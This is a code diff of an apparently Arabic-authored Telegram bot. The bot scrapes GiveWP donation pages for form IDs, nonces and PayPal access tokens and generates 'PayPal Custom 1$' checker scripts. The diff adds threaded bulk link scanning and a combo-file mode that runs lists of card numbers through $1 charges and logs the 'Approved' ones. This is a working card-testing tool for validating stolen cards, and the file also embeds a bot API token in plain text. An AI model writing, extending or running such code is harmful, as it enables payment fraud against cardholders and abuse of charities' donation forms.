@@ -10,6 +10,7 @@ import html
 from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # === بيانات البوت ===
 token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
@@ -22,11 +23,11 @@ OWNER_ID = 6843321125
 waiting_users = {}
 reply_mode = {}
 
-
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
         f.write('')
 
+processing_status = {}
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -110,8 +111,8 @@ def back_to_start(call):
         reply_markup=FRA
     )
 
-# ============ أمر سحب PayPal (الكود الأصلي كما هو) ============
-@bot.message_handler(func=lambda m: m.text.lower().startswith('.paypal') or m.text.lower().startswith('/paypal'))
+# ============ أمر سحب PayPal ============
+@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
 def ali_al2(massege):
     with open("blockusers.txt", "r") as file:
         blocked = file.read().splitlines()
@@ -119,13 +120,14 @@ def ali_al2(massege):
         bot.send_message(massege.chat.id, 'The admin has blocked you.')
         return
 
-    ko = bot.reply_to(massege, "- The gate is being withdrawn ...").message_id
+    ko = bot.send_message(massege.chat.id, "- The gate is being withdrawn ...")
+    
     try:
         parts = massege.text.split(maxsplit=1)
         if len(parts) != 2:
             bot.edit_message_text(
                 chat_id=massege.chat.id,
-                message_id=ko,
+                message_id=ko.message_id,
                 text='''- Please send the link like this:
 
 <code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
@@ -138,7 +140,7 @@ def ali_al2(massege):
         if not link.startswith(("http://", "https://")):
             bot.edit_message_text(
                 chat_id=massege.chat.id,
-                message_id=ko,
+                message_id=ko.message_id,
                 text="Invalid link format ❌",
                 parse_mode="HTML"
             )
@@ -149,28 +151,28 @@ def ali_al2(massege):
         if r.status_code != 200:
             bot.edit_message_text(
                 chat_id=massege.chat.id,
-                message_id=ko,
+                message_id=ko.message_id,
                 text=f"Site returned status: {r.status_code} ❌"
             )
             return
 
         bot.edit_message_text(
             chat_id=massege.chat.id,
-            message_id=ko,
+            message_id=ko.message_id,
             text="Gate found ✅"
         )
 
     except requests.exceptions.Timeout:
-        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text="The site took too long to respond ⏳")
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
         return
     except requests.exceptions.ConnectionError:
-        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text="Connection error or site offline ❌")
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
         return
     except requests.exceptions.InvalidURL:
-        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text="Invalid URL ❌")
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Invalid URL ❌")
         return
     except Exception as e:
-        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text=f"Error ❌\n<code>{e}</code>", parse_mode="HTML")
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{e}</code>", parse_mode="HTML")
         return
 
     user = generate_user_agent()
@@ -188,7 +190,7 @@ def ali_al2(massege):
     else:
         bot.edit_message_text(
             chat_id=massege.chat.id,
-            message_id=ko,
+            message_id=ko.message_id,
             text='''Data Client Token not found ⚠️''',
             parse_mode="HTML"
         )
@@ -298,7 +300,7 @@ def ali_al2(massege):
     else:
         bot.edit_message_text(
             chat_id=massege.chat.id,
-            message_id=ko,
+            message_id=ko.message_id,
             text=f'''Token not In Data️''',
             parse_mode="HTML"
         )
@@ -437,8 +439,6 @@ class PayPal:
                 self.email = f"{{random.choice(self.first_name)}}{{random.choice(self.last_name)}}{{random.randint(100,999)}}@gmail.com"
                 self.r = requests.Session()
                 self.uu = UserAgent()
-
-
 
         def Key(self):
                 he1 = {{
@@ -701,8 +701,6 @@ class PayPal:
                         except:
                                 return "UNKNOWN_ERROR"
 
-
-
 if __name__ == '__main__':
         Getat = 'PayPal Custom 1$'
         print(f'Cheker {{Getat}}')
@@ -770,7 +768,7 @@ Dev: @nnunrr''',
         )
     os.remove(file_name)
 
-# ============ ميزة سحب من ملف ============
+# ============ ميزة سحب من ملف مع عداد ============
 @bot.message_handler(commands=['bulk'])
 def bulk_extract_start(message):
     with open("blockusers.txt", "r") as file:
@@ -779,12 +777,12 @@ def bulk_extract_start(message):
         bot.send_message(message.chat.id, 'The admin has blocked you.')
         return
 
-    msg = bot.reply_to(message, "Send a .txt file with links (one link per line):")
+    msg = bot.reply_to(message, "📁 Send a .txt file with links (one link per line):")
     bot.register_next_step_handler(msg, process_bulk_file)
 
 def process_bulk_file(message):
     if not message.document:
-        bot.reply_to(message, "Please send a .txt file.")
+        bot.reply_to(message, "❌ Please send a .txt file.")
         return
 
     try:
@@ -794,51 +792,74 @@ def process_bulk_file(message):
         links = [link.strip() for link in links if link.strip()]
 
         if not links:
-            bot.reply_to(message, "File is empty.")
+            bot.reply_to(message, "❌ File is empty.")
             return
 
         total = len(links)
-        status_msg = bot.reply_to(message, f"⏳ Processing {total} links...")
-        success_count = 0
-        files_sent = []
-
-        for i, link in enumerate(links, 1):
+        user_id = message.from_user.id
+        chat_id = message.chat.id
+        
+        # تهيئة العداد
+        processing_status[user_id] = {
+            'total': total,
+            'processed': 0,
+            'live': 0,
+            'dead': 0,
+            'lock': threading.Lock()
+        }
+        
+        status_msg = bot.reply_to(message, f"""📊 <b>جاري فحص الروابط...</b>
+━━━━━━━━━━━━━━━━━━
+📌 إجمالي الروابط: {total}
+✅ شغالة: 0
+❌ ميتة: 0
+⏳ التقدم: 0%
+━━━━━━━━━━━━━━━━━━
+⏱️ جاري المعالجة...""", parse_mode="HTML")
+        
+        # دالة فحص الرابط
+        def check_link(link, index):
             try:
                 if not link.startswith(("http://", "https://")):
-                    continue
-
-                # استخدام نفس كود السحب الأصلي
-                user = generate_user_agent()
-                r = requests.Session()
-                headers = {'user-agent': user}
-                res = r.get(url=link, headers=headers, timeout=15).text
+                    return None
                 
+                # فحص سريع
+                r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
+                if r.status_code != 200:
+                    return None
+                
+                res = r.text
+                # البحث عن البيانات المطلوبة
                 id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
                 id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
                 nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
                 anc = re.search(r'"data-client-token":"(.*?)"', res)
                 
                 if not all([id_form1, id_form2, nonec, anc]):
-                    continue
+                    return None
                 
                 id_form1 = id_form1.group(1)
                 id_form2 = id_form2.group(1)
                 nonec = nonec.group(1)
                 enc = anc.group(1)
                 dec = base64.b64decode(enc).decode('utf-8')
-                au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+                au = re.search(r'"accessToken":"(.*?)"', dec)
+                if not au:
+                    return None
+                au = au.group(1)
                 
                 parsed = urlparse(link)
                 USER_URL2 = f'https://{parsed.netloc}'
                 USER_URL = parsed.path
-
+                
+                # محاولة استخراج token
                 headers = {
                     'origin': f'{USER_URL2}',
                     'referer': f'{USER_URL}',
                     'user-agent': 'Mozilla/5.0',
                     'x-requested-with': 'XMLHttpRequest',
                 }
-
+                
                 data = MultipartEncoder({
                     'give-form-id-prefix': (None, id_form1),
                     'give-form-id': (None, id_form2),
@@ -854,11 +875,81 @@ def process_bulk_file(message):
                 headers['content-type'] = data.content_type
                 params = {'action': 'give_paypal_commerce_create_order'}
                 
-                response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
-                tok = response.json()['data']['id']
-
-                # انشاء ملف Python
-                text_content = f'''import requests, re, random, time, base64
+                response = requests.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=10)
+                if response.status_code != 200:
+                    return None
+                response_json = response.json()
+                if 'data' not in response_json or 'id' not in response_json['data']:
+                    return None
+                
+                # الرابط شغال ✅
+                return {
+                    'link': link,
+                    'id_form1': id_form1,
+                    'id_form2': id_form2,
+                    'nonec': nonec,
+                    'au': au,
+                    'url': USER_URL2,
+                    'path': USER_URL
+                }
+            except:
+                return None
+        
+        # استخدام ThreadPoolExecutor للسرعة
+        live_data = []
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = []
+            for i, link in enumerate(links, 1):
+                future = executor.submit(check_link, link, i)
+                futures.append((future, i, link))
+            
+            for future, i, link in futures:
+                try:
+                    result = future.result(timeout=15)
+                    with processing_status[user_id]['lock']:
+                        processing_status[user_id]['processed'] += 1
+                        if result:
+                            processing_status[user_id]['live'] += 1
+                            live_data.append(result)
+                        else:
+                            processing_status[user_id]['dead'] += 1
+                        
+                        # تحديث التقدم
+                        processed = processing_status[user_id]['processed']
+                        live = processing_status[user_id]['live']
+                        dead = processing_status[user_id]['dead']
+                        progress = int((processed / total) * 100)
+                        
+                        if processed % 5 == 0 or processed == total:
+                            bar_length = 20
+                            filled = int((progress / 100) * bar_length)
+                            bar = '█' * filled + '░' * (bar_length - filled)
+                            
+                            text = f"""📊 <b>جاري فحص الروابط...</b>
+━━━━━━━━━━━━━━━━━━
+📌 إجمالي الروابط: {total}
+✅ شغالة: {live}
+❌ ميتة: {dead}
+⏳ التقدم: {progress}% {bar}
+━━━━━━━━━━━━━━━━━━
+⏱️ تم فحص {processed} من {total}"""
+                            
+                            try:
+                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
+                            except:
+                                pass
+                except:
+                    with processing_status[user_id]['lock']:
+                        processing_status[user_id]['processed'] += 1
+                        processing_status[user_id]['dead'] += 1
+        
+        # النتيجة النهائية
+        status = processing_status[user_id]
+        
+        # إرسال كل رابط حي كملف Python
+        if live_data:
+            for idx, data in enumerate(live_data, 1):
+                code = f'''import requests, re, random, time, base64
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
@@ -869,22 +960,24 @@ class PayPal:
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
         self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
         self.donation = "1.00"
-        self.id_form1 = "{id_form1}"
-        self.id_form2 = "{id_form2}"
-        self.nonec = "{nonec}"
-        self.au = "{au}"
-        url = '{link}'
+        self.id_form1 = "{data['id_form1']}"
+        self.id_form2 = "{data['id_form2']}"
+        self.nonec = "{data['nonec']}"
+        self.au = "{data['au']}"
+        url = '{data['link']}'
         parsed = urlparse(url)
         self.url = parsed.netloc
         self.inurl = parsed.path
         self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
         self.r = requests.Session()
         self.uu = UserAgent()
+        self.checked = 0
 
     def Key(self):
         return self.au, self.id_form1, self.id_form2, self.nonec
 
     def Charge(self, ccx):
+        self.checked += 1
         ccx = ccx.strip()
         n = ccx.split("|")[0]
         mm = ccx.split("|")[1]
@@ -948,39 +1041,97 @@ class PayPal:
             except: return "UNKNOWN_ERROR"
 
 if __name__ == '__main__':
-    print('PayPal Gateway - Dev: @nnunrr')
-    ar = input('Enter Card (n|mm|yy|cvc): ')
-    rr = PayPal()
-    resulti = rr.Charge(ar)
-    print('Response: ' + resulti)
-'''
-                success_count += 1
-                safe_name = re.sub(r'[^a-zA-Z0-9]', '_', link[:30])
-                file_name = f'gateway_{i}_{safe_name}.py'
-                with open(file_name, "w", encoding="utf-8") as f:
-                    f.write(text_content)
-                with open(file_name, "rb") as f:
+    Getat = 'PayPal Custom 1$'
+    print(f'Cheker {{Getat}}')
+    print('━' * 30)
+    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
+    if Br == '1':
+        try:
+            while True:
+                ar = input('Enter Card ( n | mm | yy | cvc ): ')
+                rr = PayPal()
+                itt = rr.Key()
+                resulti = rr.Charge(ar)
+                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
+                    with open('Approved Card.txt', "a") as f:
+                        f.write(ar + f': {{resulti}} > {{Getat}}')
+                print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
+                time.sleep(1)
+        except:
+            pass
+    else:
+        noy = 0
+        live = 0
+        dead = 0
+        cr = input('Enter Name Combo: ')
+        with open(cr, "r") as f:
+            crads = f.read().splitlines()
+            print('Wait Checking Your Card ...')
+            print('━' * 30)
+            for P in crads:
+                noy += 1
+                try:
+                    rr = PayPal()
+                    itt = rr.Key()
+                    resulti = rr.Charge(P)
+                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
+                        live += 1
+                        with open('Approved Card.txt', "a") as f:
+                            f.write(P + ': {{resulti}} > {{Getat}}')
+                    else:
+                        dead += 1
+                except:
+                    resulti = 'Error'
+                    dead += 1
+                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
+                time.sleep(1)
+            print('━' * 30)
+            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')
+            print('━' * 30)'''
+                
+                file_name = f'gateway_{idx}_{user_id}.py'
+                with open(file_name, 'w', encoding='utf-8') as f:
+                    f.write(code)
+                with open(file_name, 'rb') as f:
                     bot.send_document(
-                        message.chat.id, f,
-                        caption=f"Gateway #{i} ✅\nLink: {link}\nDev: @nnunrr"
+                        chat_id,
+                        f,
+                        caption=f"""✅ <b>Gateway #{idx}</b>
+━━━━━━━━━━━━━━━━━━━━
+🔗 Link: <code>{data['link']}</code>
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr""",
+                        parse_mode="HTML"
                     )
                 os.remove(file_name)
-                files_sent.append(i)
-
-            except Exception as e:
-                pass
-
-            if i % 3 == 0 or i == total:
-                try:
-                    bot.edit_message_text(f"⏳ Progress: {i}/{total} | Extracted: {len(files_sent)}", message.chat.id, status_msg.message_id)
-                except:
-                    pass
-            time.sleep(1)
-
-        bot.send_message(message.chat.id, f"<b>📊 Bulk Extraction Complete</b>\n\nTotal: {total}\nExtracted: {len(files_sent)}\n\nDev: @nnunrr", parse_mode="HTML")
-
+                time.sleep(0.3)
+            
+            # النتيجة النهائية
+            final_text = f"""📊 <b>✅ Bulk Extraction Complete!</b>
+━━━━━━━━━━━━━━━━━━━━
+📌 Total Links: {status['total']}
+✅ Live (Extracted): {status['live']}
+❌ Dead (Failed): {status['dead']}
+💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr"""
+            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
+        else:
+            no_live_text = f"""📊 <b>❌ No live links found!</b>
+━━━━━━━━━━━━━━━━━━━━
+📌 Total Links: {status['total']}
+✅ Live: 0
+❌ Dead: {status['dead']}
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr"""
+            bot.edit_message_text(no_live_text, chat_id, status_msg.message_id, parse_mode="HTML")
+        
+        # تنظيف
+        if user_id in processing_status:
+            del processing_status[user_id]
+            
     except Exception as e:
-        bot.reply_to(message, f"Error: {e}")
+        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
 
 # === نظام الحظر ===
 @bot.message_handler(commands=['block2'])
@@ -992,7 +1143,7 @@ def block_user(message):
         user_id_to_block = message.text.split()[1]
         with open('blockusers.txt', 'a') as file:
             file.write(f"{user_id_to_block}\n")
-        bot.reply_to(message, f"User ID {user_id_to_block} blocked.")
+        bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
     except:
         bot.reply_to(message, "Usage: /block2 [user_id]")
 
@@ -1009,15 +1160,15 @@ def unblock_user(message):
             for line in lines:
                 if line.strip() != user_id_to_unblock:
                     file.write(line)
-        bot.reply_to(message, f"User ID {user_id_to_unblock} unblocked.")
+        bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
     except:
         bot.reply_to(message, "Usage: /unblock2 [user_id]")
 
 # === تشغيل البوت ===
-print('- Bot is running...')
+print('✅ Bot is running...')
 while True:
     try:
-        bot.infinity_polling(none_stop=True)
+        bot.infinity_polling(none_stop=True, interval=0)
     except Exception as e:
-        print(f'- Error: {e}')
+        print(f'❌ Error: {e}')
         time.sleep(5)
